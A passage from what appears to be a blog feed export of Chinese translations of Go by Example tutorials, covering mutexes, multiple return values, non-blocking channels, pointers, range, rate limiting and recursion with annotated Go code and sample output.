&quot;</span>, rp.area())</span><br><span class="line">    fmt.Println(<span class="string">&quot;perim: &quot;</span>, rp.perim())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run methods.go </span><br><span class="line">area:  50</span><br><span class="line">perim: 30</span><br><span class="line">area:  50</span><br><span class="line">perim: 30</span><br></pre></td></tr></table></figure>


<p>原文链接：<a href="https://gobyexample.com/methods">Go by Example: Methods</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Mutexes</title>
    <url>/2017/12/12/go-by-example-mutexes/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Mutexes"><a href="#Go-by-Example-Mutexes" class="headerlink" title="Go by Example: Mutexes"></a><center>Go by Example: Mutexes</center></h2><p>在前面的示例中我们看到如何通过原子操作来管理简单的计数器。对于更复杂的状态，我们可以使用互斥锁在多个goroutine中安全地访问数据。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;math/rand&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;sync/atomic&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 此处状态是一个map</span></span><br><span class="line">    <span class="keyword">var</span> state = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>]<span class="type">int</span>)</span><br><span class="line">    <span class="comment">// 初始化锁</span></span><br><span class="line">    <span class="keyword">var</span> mutex = &amp;sync.Mutex&#123;&#125;</span><br><span class="line">    <span class="comment">// 定义两个变量用于追踪读和写的总次数</span></span><br><span class="line">    <span class="keyword">var</span> readOps <span class="type">uint64</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">var</span> writeOps <span class="type">uint64</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动100个goroutines读取状态值，每个goroutine耗时1毫秒</span></span><br><span class="line">    <span class="keyword">for</span> r := <span class="number">0</span>; r &lt; <span class="number">100</span>; r++ &#123;</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            total := <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> &#123;</span><br><span class="line">                <span class="comment">// 随机读取状态的某一个值</span></span><br><span class="line">                <span class="comment">// 1、加锁</span></span><br><span class="line">                <span class="comment">// 2、读取</span></span><br><span class="line">                <span class="comment">// 3、解锁</span></span><br><span class="line">                key := rand.Intn(<span class="number">5</span>)</span><br><span class="line">                mutex.Lock()</span><br><span class="line">                total += state[key]</span><br><span class="line">                mutex.Unlock()</span><br><span class="line">                <span class="comment">// 次数自增1</span></span><br><span class="line">                atomic.AddUint64(&amp;readOps, <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">                <span class="comment">// 两次读取之间睡眠1毫秒</span></span><br><span class="line">                time.Sleep(time.Millisecond)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 同上，启动10个goroutines模拟写操作</span></span><br><span class="line">    <span class="comment">// 随机给状态赋值，写操作次数自增1，睡眠1毫秒</span></span><br><span class="line">    <span class="keyword">for</span> w := <span class="number">0</span>; w &lt; <span class="number">10</span>; w++ &#123;</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            <span class="keyword">for</span> &#123;</span><br><span class="line">                key := rand.Intn(<span class="number">5</span>)</span><br><span class="line">                val := rand.Intn(<span class="number">100</span>)</span><br><span class="line">                mutex.Lock()</span><br><span class="line">                state[key] = val</span><br><span class="line">                mutex.Unlock()</span><br><span class="line">                atomic.AddUint64(&amp;writeOps, <span class="number">1</span>)</span><br><span class="line">                time.Sleep(time.Millisecond)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 睡眠一秒等待读写操作</span></span><br><span class="line">    <span class="comment">// 打印出读写次数</span></span><br><span class="line">    time.Sleep(time.Second)</span><br><span class="line">    readOpsFinal := atomic.LoadUint64(&amp;readOps)</span><br><span class="line">    fmt.Println(<span class="string">&quot;readOps:&quot;</span>, readOpsFinal)</span><br><span class="line">    writeOpsFinal := atomic.LoadUint64(&amp;writeOps)</span><br><span class="line">    fmt.Println(<span class="string">&quot;writeOps:&quot;</span>, writeOpsFinal)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用锁取出最后的状态值</span></span><br><span class="line">    mutex.Lock()</span><br><span class="line">    fmt.Println(<span class="string">&quot;state:&quot;</span>, state)</span><br><span class="line">    mutex.Unlock()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tashuo:golang ta_shuo$ go run mutex.go</span><br><span class="line">readOps: 78300</span><br><span class="line">writeOps: 7830</span><br><span class="line">state: map[1:86 0:61 4:17 2:26 3:26]</span><br></pre></td></tr></table></figure>

<p>执行程序，根据输出得知读写次数分别为78300和7830，最后的状态为map[1:86 0:61 4:17 2:26 3:26]</p>
<p>原文链接：<a href="https://gobyexample.com/mutexes">Go by Example: Mutexes</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Multiple Return Values</title>
    <url>/2017/07/18/go-by-example-mutiple-return-values/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Multiple-Return-Values"><a href="#Go-by-Example-Multiple-Return-Values" class="headerlink" title="Go by Example: Multiple Return Values"></a><center>Go by Example: Multiple Return Values</center></h2><p>golang原生支持多个返回值，这在golang的编程习惯中很常见，如函数同时返回返回值和error。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// (int, int)标识函数会返回两个int值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">vals</span><span class="params">()</span></span> (<span class="type">int</span>, <span class="type">int</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>, <span class="number">7</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 使用两个变量接收两个返回值</span></span><br><span class="line">    a, b := vals()</span><br><span class="line">    fmt.Println(a)</span><br><span class="line">    fmt.Println(b)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用‘_’可以忽略掉该返回值</span></span><br><span class="line">    _, c := vals()</span><br><span class="line">    fmt.Println(c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run multiple-return-values.go</span><br><span class="line">3</span><br><span class="line">7</span><br><span class="line">7</span><br></pre></td></tr></table></figure>


<p>原文链接：<a href="https://gobyexample.com/multiple-return-values">Go by Example: Multiple Return Values</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Non-Blocking Channel Operations</title>
    <url>/2017/08/24/go-by-example-non-blocking-channel-operation/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Non-Blocking-Channel-Operations"><a href="#Go-by-Example-Non-Blocking-Channel-Operations" class="headerlink" title="Go by Example: Non-Blocking Channel Operations"></a><center>Go by Example: Non-Blocking Channel Operations</center></h2><p>普通管道的发送与接收都是阻塞的，然而我们可以使用select的default条件来实现非阻塞的发送，接收和甚至是非阻塞的多路复用的<code>selects</code>。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    messages := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line">    signals := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里是一个非阻塞的接收者，如果管道msg就绪的话select会使用管道值执行这条分支</span></span><br><span class="line">    <span class="comment">// 否则的话select会执行default分支</span></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> msg := &lt;-messages:</span><br><span class="line">            fmt.Println(<span class="string">&quot;recieved message&quot;</span>, msg)</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;no message received&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 类似的非阻塞的发送者</span></span><br><span class="line">    msg := <span class="string">&quot;hi&quot;</span></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> messages &lt;- msg:</span><br><span class="line">            fmt.Println(<span class="string">&quot;sent message&quot;</span>, msg)</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;no message sent&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以在default分支前使用多个条件分支用于实现一个非阻塞的多路复用select</span></span><br><span class="line">    <span class="comment">// 下面的例子尝试同时非阻塞的接收messages和signals两个管道的值</span></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> msg := &lt;-messages:</span><br><span class="line">            fmt.Println(<span class="string">&quot;recieved messages&quot;</span>, msg)</span><br><span class="line">        <span class="keyword">case</span> sig := &lt;-signals:</span><br><span class="line">            fmt.Println(<span class="string">&quot;recieved signals&quot;</span>, sig)</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;no activity&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tashuo:golang ta_shuo$ go run non-blocking-channel.go</span><br><span class="line">no message received</span><br><span class="line">no message sent</span><br><span class="line">no activity</span><br></pre></td></tr></table></figure>

<p>原文链接：<a href="https://gobyexample.com/non-blocking-channel-operations">Go by Example: Non-Blocking Channel Operations</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Pointers</title>
    <url>/2017/07/18/go-by-example-pointers/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Pointers"><a href="#Go-by-Example-Pointers" class="headerlink" title="Go by Example: Pointers"></a><center>Go by Example: Pointers</center></h2><p>golang支持指针，允许在程序中传递值和记录的引用。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收一个int类型参数。</span></span><br><span class="line"><span class="comment">// 对ival的赋值不会影响外部变量的值。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">zeroval</span><span class="params">(ival <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    ival = <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收一个int指针类型的参数。</span></span><br><span class="line"><span class="comment">// 对*iptr的赋值操作会直接修改到iptr指针所指向内存的地址。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">zeroptr</span><span class="params">(iptr *<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    *iptr = <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    i := <span class="number">1</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;initial:&quot;</span>, i)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 传值。</span></span><br><span class="line">    zeroval(i)</span><br><span class="line">    fmt.Println(<span class="string">&quot;zeroval:&quot;</span>, i)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 传引用。</span></span><br><span class="line">    zeroptr(&amp;i)</span><br><span class="line">    fmt.Println(<span class="string">&quot;zeroptr:&quot;</span>, i)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 打印指针指向的内存地址。</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;pointer:&quot;</span>, &amp;i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run pointers.go</span><br><span class="line">initial: 1</span><br><span class="line">zeroval: 1</span><br><span class="line">zeroptr: 0</span><br><span class="line">pointer: 0x42131100</span><br></pre></td></tr></table></figure>

<p>原文链接：<a href="https://gobyexample.com/pointers">Go by Example: Pointers</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Range</title>
    <url>/2017/07/12/go-by-example-range/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Range"><a href="#Go-by-Example-Range" class="headerlink" title="Go by Example: Range"></a><center>Go by Example: Range</center></h2><p>range用来遍历各种不同数据结构中的元素。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 遍历slice，同array。</span></span><br><span class="line">    nums := []<span class="type">int</span>&#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">    sum := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _, num := <span class="keyword">range</span> nums &#123;</span><br><span class="line">        sum += num</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;sum:&quot;</span>, sum)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// slice和array在遍历时都会返回索引和值。</span></span><br><span class="line">    <span class="keyword">for</span> i, num := <span class="keyword">range</span> nums &#123;</span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">3</span> &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;index:&quot;</span>, i)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历map。</span></span><br><span class="line">    kvs := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;<span class="string">&quot;a&quot;</span>: <span class="string">&quot;apple&quot;</span>, <span class="string">&quot;b&quot;</span>: <span class="string">&quot;banner&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> k, v := <span class="keyword">range</span> kvs &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%s -&gt; %s\n&quot;</span>, k, v)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以只接收一个返回值，range会遍历map所有的key并返回。</span></span><br><span class="line">    <span class="keyword">for</span> k := <span class="keyword">range</span> kvs &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;key:&quot;</span>, k)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对字符串进行遍历是通过unicode字节编码进行。</span></span><br><span class="line">    <span class="comment">// 例子中的英文字符都是一个字节的长度，而中文字符‘哈’的utf8编码是三个字节长度，对应的二进制表示‘21704’，所以‘l’的索引值就是5。</span></span><br><span class="line">    <span class="keyword">for</span> i, c := <span class="keyword">range</span> <span class="string">&quot;go哈lang&quot;</span> &#123;</span><br><span class="line">        fmt.Println(i, c)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run range.go</span><br><span class="line"><span class="built_in">sum</span>: 9</span><br><span class="line">index: 1</span><br><span class="line">a -&gt; apple</span><br><span class="line">b -&gt; banana</span><br><span class="line">key: a</span><br><span class="line">key: b</span><br><span class="line">0 103</span><br><span class="line">1 111</span><br><span class="line">2 21704</span><br><span class="line">5 108</span><br><span class="line">6 97</span><br><span class="line">7 110</span><br><span class="line">8 103</span><br></pre></td></tr></table></figure>

<p>原文链接：<a href="https://gobyexample.com/range">Go by Example: Range</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Range over Channels</title>
    <url>/2017/08/24/go-by-example-range-over-channels/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Range-over-Channels"><a href="#Go-by-Example-Range-over-Channels" class="headerlink" title="Go by Example: Range over Channels"></a><center>Go by Example: Range over Channels</center></h2><p>在前面的示例中看到<code>for</code>和<code>range</code>语句如何给基本数据类型提供迭代操作，我们也可以用它们来迭代channel中接收到的值。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 定义有两个字符串缓存区的channel queue</span></span><br><span class="line">    <span class="comment">// 我们将要迭代queue中的两个值</span></span><br><span class="line">    queue := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, <span class="number">2</span>)</span><br><span class="line">    queue &lt;- <span class="string">&quot;one&quot;</span></span><br><span class="line">    queue &lt;- <span class="string">&quot;two&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(queue)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// range会迭代queue中接收到的每个值</span></span><br><span class="line">    <span class="comment">// 由于在上面已经close掉管道queue，所以在接收完两个值之和迭代就结束了</span></span><br><span class="line">    <span class="keyword">for</span> elem := <span class="keyword">range</span> queue &#123;</span><br><span class="line">        fmt.Println(elem)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tashuo:golang ta_shuo$ go run r_channel.go</span><br><span class="line">one</span><br><span class="line">two</span><br></pre></td></tr></table></figure>

<p>上面的示例中也看出可以关闭掉一个还有待接收值的非空管道。</p>
<p>原文链接：<a href="https://gobyexample.com/range-over-channels">Go by Example: Range over Channels</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Rate Limiting</title>
    <url>/2017/11/24/go-by-example-rate-limiting/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Rate-Limiting"><a href="#Go-by-Example-Rate-Limiting" class="headerlink" title="Go by Example: Rate Limiting"></a><center>Go by Example: Rate Limiting</center></h2><p>限速是控制资源利用率和维持服务质量的一种重要机制。golang通过<code>goroutines</code>、<code>channels</code>和<code>tickers</code>优雅的支持限速。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 首先来看下基本的限速功能</span></span><br><span class="line">    <span class="comment">// 假设我们想限制对请求的处理</span></span><br><span class="line">    <span class="comment">// 我们将从同一个管道中提供这样的请求</span></span><br><span class="line">    requests := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>,  <span class="number">5</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++ &#123;</span><br><span class="line">        requests &lt;- i</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(requests)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 该管道每200毫秒接收一个值</span></span><br><span class="line">    <span class="comment">// 这个是我们限速的核心</span></span><br><span class="line">    limiter := time.Tick(time.Millisecond * <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过处理每个请求时管道接收值的阻塞，我们限制每200毫秒只处理一个请求</span></span><br><span class="line">    <span class="keyword">for</span> req := <span class="keyword">range</span> requests &#123;</span><br><span class="line">        &lt;-limiter</span><br><span class="line">        fmt.Println(<span class="string">&quot;request&quot;</span>, req, time.Now())</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 某些时候可能希望在保持整体限速规则下允许少量的请求不受限制</span></span><br><span class="line">    <span class="comment">// 可以通过含有缓冲区的管道来实现</span></span><br><span class="line">    <span class="comment">// burstyLimiter管道可以使同时处理的请求达到3个</span></span><br><span class="line">    burstyLimiter := <span class="built_in">make</span>(<span class="keyword">chan</span> time.Time, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">        burstyLimiter &lt;- time.Now()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 每200毫秒发送给burstyLimiter管道一个值</span></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> t := <span class="keyword">range</span> time.Tick(time.Millisecond * <span class="number">200</span>) &#123;</span><br><span class="line">            burstyLimiter &lt;- t</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模拟5个新的请求，前三个请求由于burstyLimiter管道缓冲区的处理可以突破200毫秒的限制</span></span><br><span class="line">    burstyRequests := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">5</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++ &#123;</span><br><span class="line">        burstyRequests &lt;- i</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(burstyRequests)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> req := <span class="keyword">range</span> burstyRequests &#123;</span><br><span class="line">        &lt;-burstyLimiter</span><br><span class="line">        fmt.Println(<span class="string">&quot;request&quot;</span>, req, time.Now())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tashuo:golang ta_shuo$ go run rate-limiting.go</span><br><span class="line">request 1 2017-11-24 15:45:04.641607273 +0800 CST</span><br><span class="line">request 2 2017-11-24 15:45:04.838581623 +0800 CST</span><br><span class="line">request 3 2017-11-24 15:45:05.040839234 +0800 CST</span><br><span class="line">request 4 2017-11-24 15:45:05.241695212 +0800 CST</span><br><span class="line">request 5 2017-11-24 15:45:05.441367122 +0800 CST</span><br><span class="line">request 1 2017-11-24 15:45:05.441428032 +0800 CST</span><br><span class="line">request 2 2017-11-24 15:45:05.441435722 +0800 CST</span><br><span class="line">request 3 2017-11-24 15:45:05.441440602 +0800 CST</span><br><span class="line">request 4 2017-11-24 15:45:05.641538132 +0800 CST</span><br><span class="line">request 5 2017-11-24 15:45:05.84206538 +0800 CST</span><br></pre></td></tr></table></figure>

<p>前5个请求跟预期一样是每200秒处理一个，后面5个请求中的前3个并没有被200毫秒的规则限制到。</p>
<p>原文链接：<a href="https://gobyexample.com/rate-limiting">Go by Example: Rate Limiting</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Recursion</title>
    <url>/2017/07/18/go-by-example-recursion/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Recursion"><a href="#Go-by-Example-Recursion" class="headerlink" title="Go by Example: Recursion"></a><center>Go by Example: Recursion</center></h2><p>golang也支持递归函数。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数fact递归调用自己直到参数变为0。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fact</span><span class="params">(n <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> n * fact(n<span class="number">-1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(fact(<span class="number">7</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原文链接：<a href="https://gobyexample.com/recursion">Go by Example: Recursion</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Select</title>
    <url>/2017/08/23/go-by-example-select/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Select"><a href="#Go-by-Example-Select" class="headerlink" title="Go by Example: Select"></a><center>Go by Example: Select</center></h2><p><code>select</code>允许程序等待多个管道操作，使用<code>select</code>来组合<code>goroutine</code>和<code>channel</code>是golang的一项重要的功能。</p>
